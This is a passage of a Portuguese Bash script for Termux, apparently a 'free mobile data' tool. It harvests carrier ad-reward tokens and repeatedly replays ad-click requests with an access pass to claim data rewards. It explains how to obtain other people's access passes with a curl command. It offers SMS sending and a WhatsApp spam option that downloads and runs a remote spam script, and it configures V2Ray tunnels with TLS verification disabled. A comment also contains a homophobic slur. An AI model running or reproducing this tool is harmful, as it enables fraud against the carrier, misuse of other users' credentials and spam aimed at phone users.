test002=$(cat advidcriar.txt | grep -n , | grep -c "$advid002")
case $test002 in
1) ;;
0) echo -e "$advid002" >> advidcriar.txt ; echo -e "$impressionid002" >> impressionidcriar.txt ;echo -e "$advname002" >> advnamecriar.txt ;  echo -e "$advreward002" >> advrewardcriar.txt ;echo -e "$advmensagem002" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac

test003=$(cat advidcriar.txt | grep -n , | grep -c "$advid003")
case $test003 in
1) ;;
0) echo -e "$advid003" >> advidcriar.txt ; echo -e "$impressionid003" >> impressionidcriar.txt ;echo -e "$advname003" >> advnamecriar.txt;  echo -e "$advreward003" >> advrewardcriar.txt ;echo -e "$advmensagem003" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac

test004=$(cat advidcriar.txt | grep -n , | grep -c "$advid004")
case $test004 in
1) ;;
0) echo -e "$advid004" >> advidcriar.txt ; echo -e "$impressionid004" >> impressionidcriar.txt ;echo -e "$advname004" >> advnamecriar.txt;  echo -e "$advreward004" >> advrewardcriar.txt ;echo -e "$advmensagem004" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac

test005=$(cat advidcriar.txt | grep -n , | grep -c "$advid005")
case $test005 in
1) ;;
0) echo -e "$advid005" >> advidcriar.txt ; echo -e "$impressionid005" >> impressionidcriar.txt ;echo -e "$advname005" >> advnamecriar.txt;  echo -e "$advreward005" >> advrewardcriar.txt ;echo -e "$advmensagem005" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac

test006=$(cat advidcriar.txt | grep -n , | grep -c "$advid006")
case $test006 in
1) ;;
0) echo -e "$advid006" >> advidcriar.txt ; echo -e "$impressionid006" >> impressionidcriar.txt ;echo -e "$advname006" >> advnamecriar.txt;  echo -e "$advreward006" >> advrewardcriar.txt ;echo -e "$advmensagem006" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac

test007=$(cat advidcriar.txt | grep -n , | grep -c "$advid007")
case $test007 in
1) ;;
0) echo -e "$advid007" >> advidcriar.txt ; echo -e "$impressionid007" >> impressionidcriar.txt ;echo -e "$advname007" >> advnamecriar.txt ;  echo -e "$advreward007" >> advrewardcriar.txt ;echo -e "$advmensagem007" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac

test008=$(cat advidcriar.txt | grep -n , | grep -c "$advid008")
case $test008 in
1) ;;
0) echo -e "$advid008" >> advidcriar.txt ; echo -e "$impressionid008" >> impressionidcriar.txt ;echo -e "$advname008" >> advnamecriar.txt;  echo -e "$advreward008" >> advrewardcriar.txt ;echo -e "$advmensagem008" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac

test009=$(cat advidcriar.txt | grep -n , | grep -c "$advid009")
case $test009 in
1) ;;
0) echo -e "$advid009" >> advidcriar.txt ; echo -e "$impressionid009" >> impressionidcriar.txt ;echo -e "$advname009" >> advnamecriar.txt ;  echo -e "$advreward009" >> advrewardcriar.txt ;echo -e "$advmensagem009" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac

test0010=$(cat advidcriar.txt | grep -n , | grep -c "$advid0010")
case $test0010 in
1) ;;
0) echo -e "$advid0010" >> advidcriar.txt ; echo -e "$impressionid0010" >> impressionidcriar.txt ;echo -e "$advname0010" >> advnamecriar.txt ;  echo -e "$advreward0010" >> advrewardcriar.txt;echo -e "$advmensagem0010" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac
NewTokensRev
}




NewTokensRev(){
AZUL='\e[01;36;m'
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
clear
echo -e "${BANNER}"

TokensNovos00=$(cat advidcriar.txt |  grep -c ,)

BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'

clear
echo -e "${BANNER}"

case $TokensNovos00 in
0) eixo="NENHUM TOKEN ${visa}FOI ENCONTRADO" ; COR="${RED}" ;;

1) eixo="$TokensNovos00 TOKEN ${visa}FOI ENCONTRADO" ; COR="${GREEN}" ;;

$TokensNovos00) eixo="$TokensNovos00 TOKEN ${visa2}FORAM ENCONTRADOS" ;COR="${GREEN}" ;;

*) eixo="NENHUM TOKEN ${visa}FOI ENCONTRADO" ;COR="${NADA}" ;;
esac

gucci="$eixo"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${COR}${gucci:$b:1}${NADA}" 
sleep 0.015
done
echo
echo


gucci="NUMERO DE TELEFONE USADO: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.00001
done

gucci="$NumeroDeTelefone"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${GREEN}${gucci:$b:1}${NADA}" 
sleep 0.07
done
echo



gucci="TOTAL DE TOKENS ENCONTRADOS: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.00001
done

gucci="$TokensNovos00"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${GREEN}${gucci:$b:1}${NADA}" 
sleep 0.07
done
echo
echo

gucci="1 - PROCURAR NOVOS TOKENS "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.00001
done

gucci="ATÉ PARAR DE APARECER"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.009
done
echo




gucci="2 - TESTAR TOKENS ENCONTRADOS "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.00001
done

gucci="USAR TODOS OS TOKENS"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.009
done
echo




gucci="3 - TESTAGEM INDIVIDUAL "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.00001
done

gucci="ESCOLHER UM TOKEN"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.009
done
echo




gucci="0 - VOLTAR "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.00001
done

gucci="NENHUM TOKEN ENCONTRADO"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.009
done
echo
echo



gucci="ESCOLHA UMA OPÇÃO: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.05
done

read TokensNews01
case $TokensNews01 in
1)ProcurarMaisTokens;;

2)
case $TokensNovos00 in
0)NewTokensRev;;
*);;
esac
QualquerNome="Mensagem11"; GerarOsTokens;;

3)
case $TokensNovos00 in
0)NewTokensRev;;
*);;
esac
QualquerNome="TestadorIndividual" ; GerarOsTokens;;

0)Menu5;;

*)NewTokensRev;;
esac
} 



PassSalvos0(){
clear
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'

echo -e "${BANNER}"
TokensSave001=$(cat TokensSave.txt | grep -n - | grep -c 1:)
    case $TokensSave001 in
    1) ;;
    2) ;;
    3) ;;
    *) clear
    echo -e "${BANNER}"
    echo -e "${RED}NENHUM PASS ENCONTRADO${NADA}" ; sleep 5 ; Menu5;;
    esac
    
echo -e "${DESTACAR}ESCOLHA UM NUMERO:${NADA}"
cat TokensSave.txt | grep -n "$OPERADORA" | cut -d'-' -f1
echo
echo -e "A: ${DESTACAR}APAGAR TODOS${NADA}"
echo -e "0: ${DESTACAR}VOLTAR${NADA}"
echo
read -p $'\033[0mDIGITE UM NUMERO: ' NumeroPass
case $NumeroPass in
0)Menu5;;
A|a)rm -f TokensSave.txt ; Menu5;;
*) ;;
esac

AccessPass=$(cat TokensSave.txt | grep -n "$OPERADORA" | grep "$NumeroPass": | cut -d':' -f2 | grep -n - | cut -d'-' -f3-9)
echo -e "$AccessPass" >> chavedeacesso.txt
Buscartokens
}





ComoPegarOPass(){
clear
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
echo -e "${BANNER}"

echo -e "${GREEN}COMO PEGAR O PASS DE OUTRAS PESSOAS${NADA}"
echo
echo -e "${DESTACAR}1 - DESLIGUE A VPN, WI-FI E DEIXE APENAS OS DADOS MOVEIS LIGADOS"
echo
echo -e "2 - ESCOLHA UMA FORMA DE PEGAR O PASS"
echo
echo -e "COMANDO DO TERMUX:${GREEN}"
cat <<- EOF

clear ; curl -s -d "version=2" $UrlPass | cut -d '"' -f4 ; echo
EOF
echo
echo -e "${NADA}${DESTACAR}LINK DO NAVEGADOR:"
echo
echo -e "${GREEN}$UrlPass${NADA}"
echo
echo -e "${NADA}${DESTACAR}3 - COPIE RESPOSTA/PASS, RECORTE ELE COMO NO EXEMPLO ABAIXO, CASO PRECISE, COLE NO TESTADOR PERSONALIZADO E SALVE${NADA}"
echo
echo -e "${GREEN}24IVqUznZQYJxXPe7kqrp3XMAV1Vj5bhDcRSLtWbD_ypLt3PW_4__4Aj2BuUCCpdEOjjtLHmkg_Rk6B_ouI0aw${NADA}"
echo
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)Menu5;;
  esac
}





SmsA(){
clear
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
echo -e "${BANNER}"

read -p "DIGITE O DDD+NUMERO: " smsnumero1
echo

smsnumero=$(echo "$smsnumero1" | tr -d '+ -')

Digitos11=$(echo "$smsnumero" | wc -m)
case $Digitos11 in
12);;
*)echo -e "${RED}11 DIGITOS, POR FAVOR${NADA}"
sleep 3
Menu5;;
esac


read -p "DIGITE UMA MENSAGEM: " smsmensagem
echo
SMSenvio=$(curl -s -X POST https://textbelt.com/text --data-urlencode phone="+55 $smsnumero" --data-urlencode message="$smsmensagem" -d key=textbelt)

smsresponse1=$(echo "$SMSenvio" | grep -i -c "true")
case $smsresponse1 in
1)echo -e "${GREEN}MENSAGEM ENVIADA COM SUCESSO${NADA}"; voltar111 ;;
0);;
esac

smsresponse3=$(echo "$SMSenvio" | grep -i -c "Your phone number was not provided")
case $smsresponse3 in
1)echo -e "${RED}OCORREU UM ERRO, VERIFIQUE SEU NUMERO${NADA}" ;voltar111;;
0);;
esac

smsresponse2=$(echo "$SMSenvio" | grep -i -c "Only one test text message is allowed per day")
case $smsresponse2 in
1)echo -e "${YELLOW}LIMITE DE MENSAGENS DIARIAS EXCEDIDO\nUSE OUTRA VPN OU MUDE O NUMERO${NADA}" ;voltar111;;
0);;
esac


smsresponse4=$(echo "$SMSenvio" | grep -i -c "false")
case $smsresponse4 in
*)echo -e "${YELLOW}OCORREU UM ERRO DESCONHECIDO${NADA}";;
esac
voltar111
}
voltar111(){
echo
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)Menu3;;
  esac
}




TestadorIndividual(){
clear

NomeAne=$(cat ChavePass.txt | wc -l)
clear
case $NomeAne in
0)echo -e "$AccessPass" >> ChavePass.txt;;
*);;
esac
clear
echo -e "$NumeroDeTelefone" >> TestadorIndividual.txt
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
echo -e "${BANNER}"

LimiteAds=$(cat advid.txt | wc -l)

gucci="NUMERO DE TELEFONE USADO: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.0001
done

gucci="$NumeroDeTelefone"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${GREEN}${gucci:$b:1}${NADA}" 
sleep 0.07
done
echo
echo

for i in $(seq $LimiteAds)
do 

AdvNameTest=$(cat advname.txt | sed -n "$i"p)

AdvRewardTest=$(cat advreward.txt | sed -n "$i"p)

AdvMensagemTest=$(cat advmensagem.txt | sed -n "$i"p)

gucci="$i - ADS $i"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.0001
done
echo

gucci="ADV NAME: $AdvNameTest"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${YELLOW}${gucci:$b:1}${NADA}" 
sleep 0.0001
done
echo


gucci="ADV MENSAGEM: $AdvMensagemTest"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${YELLOW}${gucci:$b:1}${NADA}" 
sleep 0.0001
done
echo

rewardcheck=$(echo "$AdvRewardTest" | grep -c "ganhou")
case $rewardcheck in
0)rick="ADV REWARD: Sem Mensagem";;
*)rick="ADV REWARD: $AdvRewardTest"
esac

gucci="$rick"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${YELLOW}${gucci:$b:1}${NADA}" 
sleep 0.0001
done


echo
echo
echo
done

gucci="0 - VOLTAR"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.05
done


echo
echo
echo

gucci="ESCOLHA UM ADS: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.05
done

read adstestado
case $adstestado in
0)rm -f advname.txt
rm -f advreward.txt
rm -f advid.txt
rm -f impressionid.txt
NewTokensRev;;
*);;
esac

echo
echo
echo
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
echo -e "${NADA}${LETRAPRETA}           TESTAGEM INICIADA           ${NADA}"

AdvIDTest=$(cat advid.txt | tr -d ',' | sed -n "$adstestado"p)

ImpressionTest=$(cat impressionid.txt | sed -n "$adstestado"p)


for i in $(seq $Vizes);
do

reward1=$(curl -s $UrlClick -d "advId=$AdvIDTest&eventImpressionId=$ImpressionTest&apass=$AccessPass")
rw1=$(echo $reward1 | grep -c "evtClickId")
case $rw1 in

0)gucci1="NAO ELEGIVEL NESSE TESTADOR"
gucci=$(echo "$gucci1" | fold -w 1 )
a=$(echo -e "$gucci" | wc -l)
for coint in $(seq $a)
do
b=$(echo -e "$gucci" | sed -n "$coint"p)
echo -e "${RED}$b\c"
sleep 0.05
done
sleep 2
R1p1t1r;;

1) gucci1="SUCESSO NO ENVIO DOS MBS"
gucci=$(echo "$gucci1" | fold -w 1 )
a=$(echo -e "$gucci" | wc -l)
for coint in $(seq $a)
do
b=$(echo -e "$gucci" | sed -n "$coint"p)
echo -ne "${GREEN}$b"
sleep 0.05
done
echo -ne " - "
sleep 0.06
echo -ne "$i"
sleep 0.14
echo
;;
esac 
done

am start -n com.termux/com.termux.app.TermuxActivity > /dev/null 2>&1

smsnumero=$(echo "$NumeroDeTelefone" | cut -c3-13)

Mensagem1=$(echo $[ 1 + $[ RANDOM % 9  ]])

smsmensagem=$( echo "$Mensagens1" | sed -n "$Mensagem1"p)


SMSenvio=$(curl -s -m 20 -X POST https://textbelt.com/text --data-urlencode phone="+55 $smsnumero" --data-urlencode message="$smsmensagem" -d key=textbelt)

R1p1t1r
}


#O carioca é um viado

R1p1t1r(){
clear
echo -e "${VermelhoAll}            TESTAGEM FINALIZADA             ${NADA}"
echo -e "${BANNER}"

gucci="NUMERO DE TELEFONE USADO: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.0001
done

gucci="$NumeroDeTelefone"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${GREEN}${gucci:$b:1}${NADA}" 
sleep 0.07
done
echo
echo





gucci="1 - ESCOLHER OUTRO TOKEN "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.0001
done


gucci="$Aguardar1"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.009
done
echo


gucci="0 - VOLTAR "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.0001
done


gucci="PROCURAR NOVOS TOKENS "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.009
done
echo
echo



gucci="ESCOLHA UMA OPÇÃO: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.06
done

read TokensNews
case $TokensNews in
1)TestadorIndividual;;
0)rm -f advname.txt
rm -f advreward.txt
rm -f advid.txt
rm -f impressionid.txt
NewTokensRev;;
*)R1p1t1r;;
esac
}

WppSpam(){
clear
echo -e "============================================${NADA}\n${LETRAPRETA}                  SPAM SMS                  ${NADA}\n============================================${NADA}"
echo -e "1 - INICIAR SPAM"
echo -e "2 - INSTALAR SPAM"
echo -e "0 - VOLTAR"
echo
read -p "Escolha uma Opção: " option
case $option in 
1)python3 wppspam.py;;
2);;
0)Menu5;;
esac

echo
echo
echo -e "${DESTACAR}LIGUE A INTERNET${NADA}"
echo
read -n1 -p "DIGITE Y DEPOIS DE LIGAR" optione12 ; case $optione12 in 
  y|Y)echo ; echo ;apt update -y; apt upgrade -y ; pip3 install requests; pkg install python -y; curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/ua.txt && chmod +x ua.txt ; curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/wppspam.py && chmod +x wppspam.py && cp wppspam.py $PREFIX/bin/  ; echo -e "${GREEN}SCRIPT BAIXADO COM SUCESSO${NADA}"; sleep 5 ;python3 wppspam.py;;
  *)Menu5;;
  esac
}












MagiskRay(){
clear
echo -e '\n'
echo "     ==================================="
echo "                    MBS FREE     "
echo "         ===================================" 
echo "                ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "              ${DESTACAR}[ 1 ] - V2ray for android"
echo -e "              [ 2 ] - Xray for android"
echo -e "              [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo 
echo "@alpacinoo007"
echo "@luanw04"
echo
read -n1 -p "ESCOLHA UMA OPÇÃO: " TokensNews01
case $TokensNews01 in
1)MagiskRay1;;
2)MagiskRay2;;
0)MenuPrincipal;;
*)MagiskRay;;
esac
}












MagiskRay1(){
clear
echo -e "${DESTACAR}V2RAY Core Magisk${NADA}"
echo
echo -e "${RED}Necessario ter instalado o modulo do magisk:\n${GREEN}V2RAY For Android${DESTACAR}"
echo
echo -e "1 - Iniciar serviços V2RAY"
echo -e "2 - Parar serviços V2RAY"
echo -e "3 - Mudar configuração V2RAY"
echo -e "4 - Instalar sudo"
echo -e "5 - Corrigir instalação do Modulo"
echo -e "6 - Roteamento"
echo -e "0 - Voltar"
echo
read -p "Escolha uma opção: " option
echo -e "${NADA}"
case $option in
1)rm -f appid.list
abc=$(su -c cat /data/v2ray/appid.list | grep -c '0')
case $abc in
1);;
*)echo -e "0" >> appid.list && su -c cp appid.list /data/v2ray/appid.list;;
esac
sudo bash /data/adb/modules/v2ray/scripts/v2ray.service start
sudo /data/adb/modules/v2ray/scripts/v2ray.tproxy enable

sleep 6

su -c settings put global airplane_mode_on 1
su -c am broadcast -a android.intent.action.AIRPLANE_MODE > /dev/null 2>&1 && su -c settings put global airplane_mode_on 0
su -c am broadcast -a android.intent.action.AIRPLANE_MODE > /dev/null 2>&1 

;;
2)sudo bash /data/adb/modules/v2ray/scripts/v2ray.service stop;;
4)pkg install tsu -y; main;;
3)
echo -e "${DESTACAR}1 - Configuração JSON"
echo -e "2 - Configuração URL VMESS"
echo -e "3 - Configuração URL VLESS"
echo -e "4 - Configuração URL Trojan"

echo
read -p "Escolha uma opção: " opi
echo -e "${NADA}"
case $opi in
1)JaiSon;;
2)UrlVmess;;
3)UrlVless;;
4)UrlTrojan;;
*)MagiskRay1;;
esac
;;

5)echo
echo -e "${DESTACAR}Movendo o cURL pra pasta bin...${NADA}"
su -c cp /data/user/0/com.termux/files/usr/bin/curl /bin/curl
;;


6)
echo -e "${DESTACAR}1 - IP Roteamento Wi-Fi"
echo -e "2 - IP Roteamento USB"
echo -e "3 - IP Roteamento Bluetooth"
echo
read -p "Escolha uma opção: " option
echo
case $option in

1)
su -c rm -f /data/v2ray/softap.list
su -c 'svc wifi disable'
echo -e "${DESTACAR}Ligue o Roteador"
echo
read -n1 -p "APERTE QUALQUER TECLA PARA CONTINUAR" optione1
case $optione1 in
*);;
esac

rm -f IPv2ray.txt
Tent1=$(su -c ifconfig wlan0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-3)

Tent2=$(su -c ifconfig swlan0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-3)

Tent3=$(su -c ifconfig ap0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-3)

IP=$(echo -e "$Tent1\n$Tent2\n$Tent3" | grep ".")

echo -e "$IP.0/24" >> IPv2ray.txt
su -c cp IPv2ray.txt /data/v2ray/softap.list
;;


2)su -c rm -f /data/v2ray/softap.list
rm -f IPv2ray.txt
su -c 'svc wifi disable'
echo -e "${DESTACAR}Ligue o Roteamento USB"
echo
read -n1 -p "APERTE QUALQUER TECLA PARA CONTINUAR" optione1
case $optione1 in
*);;
esac


Tent=$(su -c ifconfig rndis0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-3)

IP=$(echo -e "$Tent" | grep ".")

echo -e "$IP.0/24" >> IPv2ray.txt
su -c cp IPv2ray.txt /data/v2ray/softap.list
;;


3)su -c rm -f /data/v2ray/softap.list
rm -f IPv2ray.txt
su -c 'svc wifi disable'
echo -e "${DESTACAR}Ligue o Roteamento Bluetooth"
echo
read -n1 -p "APERTE QUALQUER TECLA PARA CONTINUAR" optione1
case $optione1 in
*);;
esac


Tent=$(su -c ifconfig bt-pan | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-3)

IP=$(echo -e "$Tent" | grep ".")

echo -e "$IP.0/24" >> IPv2ray.txt
su -c cp IPv2ray.txt /data/v2ray/softap.list
;;

esac
;; 

0)MenuPrincipal;;
*)MagiskRay1;;
esac
echo -e "${DESTACAR}"
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
case $optione1 in
*)MagiskRay1;;
esac
}







JaiSon(){
echo -e "${GREEN}Cole a configuração em JSON..."
sleep 4
rm -f v2ray.txt
echo -e "" >> v2ray.txt
su -c sed -i 1,999d /data/v2ray/config.json
nano v2ray.txt
a=$(su -c sed -n '/"outbounds"/,/"block"/p' v2ray.txt)
su -c rm -f v2ray.txt

echo -e "
  {
  +log+: {
    +access+: +none+,

    +error+: +/data/v2ray/run/error.log+,

    +loglevel+: +none+
  },
  +inbounds+: [{
    +port+: 65535,

    +listen+: +0.0.0.0+,

    +tag+: +proxy-inbound+,

    +protocol+: +dokodemo-door+,

    +settings+: {
      +udp+: true,
      +userLevel+: 8,
      +network+: +tcp,udp+,
      +followRedirect+: true
    },

    +sniffing+: {
      +enabled+: false
    }
  }],
${a}
    }
  ],
  +policy+: {
    +levels+: {
      +8+: {
        +connIdle+: 300,
        +downlinkOnly+: 1,
        +handshake+: 4,
        +uplinkOnly+: 1
      }
    },
    +system+: {
      +statsOutboundUplink+: false,
      +statsOutboundDownlink+: false
    }
  },
  +routing+: {
    +domainStrategy+: +AsIs+,
    +rules+:[]
  },
  +other+: {}
}
" >> v2ray.txt 
su -c cp v2ray.txt /data/v2ray/config.json
su -c sed -i 's/+/\"/g' /data/v2ray/config.json
su -c chmod 777 /data/v2ray/config.json

rm -f appid.list
abc=$(su -c cat /data/v2ray/appid.list | grep -c '0')
case $abc in
1);;
*)echo -e "0" >> appid.list && su -c cp appid.list /data/v2ray/appid.list;;
esac

sudo bash /data/adb/modules/v2ray/scripts/v2ray.service stop > /dev/null 2>&1
echo -e "${NADA}"
echo -e "${DESTACAR}"
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
case $optione1 in
*)MagiskRay1;;
esac
}














UrlVmess(){
su -c rm -f v2ray.txt

echo
echo -ne "${DESTACAR}Cole a URL VMESS: ${GREEN}"
read configur


su -c sed -i 1,999d /data/v2ray/config.json


XequeMate=$(echo "$configur" | cut -d'/' -f3 | base64 -d)

WSBug=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep add | cut -d'"' -f4)


Dominio=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep host | cut -d'"' -f4)


User=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep '"id"' | cut -d'"' -f4)


path=$(echo "$XequeMate" | tr -s ',' '\n' | grep '"path"' | cut -d'"' -f4)


aid=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep 'aid"' | cut -d'"' -f4)


port=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep 'port"' | cut -d'"' -f4)

case $port in
443)OuthLock="+outbounds+: [
    {
      +mux+: {
        +concurrency+: -1,
        +enabled+: false
      },
      +protocol+: +vmess+,
      +settings+: {
        +vnext+: [
          {
            +address+: +$WSBug+,
            +port+: $port,
            +users+: [
              {
                +alterId+: $aid,
                +encryption+: ++,
                +flow+: ++,
                +id+: +$User+,
                +level+: 8,
                +security+: +auto+
              }
            ]
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: +tls+,
        +tlsSettings+: {
          +allowInsecure+: true,
          +serverName+: +$Dominio+
        },
        +wsSettings+: {
          +headers+: {
            +Host+: +$Dominio+
          },
          +path+: +$path+
        }
      },
      +tag+: +proxy+
    },
    {
      +protocol+: +freedom+,
      +settings+: {},
      +tag+: +direct+
    },
    {
      +protocol+: +blackhole+,
      +settings+: {
        +response+: {
          +type+: +http+
        }
      },
      +tag+: +block+
    }
  ],"
;;





80)OuthLock="+outbounds+: [
    {
      +mux+: {
        +concurrency+: -1,
        +enabled+: false
      },
      +protocol+: +vmess+,
      +settings+: {
        +vnext+: [
          {
            +address+: +$WSBug+,
            +port+: $port,
            +users+: [
              {
                +alterId+: 32,
                +encryption+: ++,
                +flow+: ++,
                +id+: +$User+,
                +level+: 8,
                +security+: +auto+
              }
            ]
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: ++,
        +wsSettings+: {
          +headers+: {
            +Host+: +$Dominio+
          },
          +path+: +$path+
        }
      },
      +tag+: +proxy+
    },
    {
      +protocol+: +freedom+,
      +settings+: {},
      +tag+: +direct+
    },
    {
      +protocol+: +blackhole+,
      +settings+: {
        +response+: {
          +type+: +http+
        }
      },
      +tag+: +block+
    }
  ],"
;;

*)echo
echo
echo -e "${RED}Configuração Invalida${NADA}"
sleep 5
MagiskRay1
;;
esac

echo -e "
  {
  +log+: {
    +access+: +none+,

    +error+: +/data/v2ray/run/error.log+,

    +loglevel+: +warning+
  },
  +inbounds+: [{
    +port+: 65535,

    +listen+: +0.0.0.0+,

    +tag+: +proxy-inbound+,

    +protocol+: +dokodemo-door+,

    +settings+: {
      +udp+: true,
      +userLevel+: 8,
      +network+: +tcp,udp+,
      +followRedirect+: true
    },

    +sniffing+: {
      +enabled+: false
    }
  }],
$OuthLock
  +policy+: {
    +levels+: {
      +8+: {
        +connIdle+: 300,
        +downlinkOnly+: 1,
        +handshake+: 4,
        +uplinkOnly+: 1
      }
    },
    +system+: {
      +statsOutboundUplink+: false,
      +statsOutboundDownlink+: false
    }
  },
  +routing+: {
    +domainStrategy+: +AsIs+,
    +rules+:[]
  },
  +other+: {}
}
" >> v2ray.txt 
su -c cp v2ray.txt /data/v2ray/config.json
su -c sed -i 's/+/\"/g' /data/v2ray/config.json
su -c chmod 777 /data/v2ray/config.json




rm -f appid.list
abc=$(su -c cat /data/v2ray/appid.list | grep -c '0')
case $abc in
1);;
*)echo -e "0" >> appid.list && su -c cp appid.list /data/v2ray/appid.list;;
esac

sudo bash /data/adb/modules/v2ray/scripts/v2ray.service stop > /dev/null 2>&1
echo -e "${NADA}"
echo -e "${DESTACAR}"
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
case $optione1 in
*)MagiskRay1;;
esac
}



















UrlVless(){
su -c rm -f v2ray.txt

echo
echo -ne "${DESTACAR}Cole a URL VLESS: ${GREEN}"
read carioca

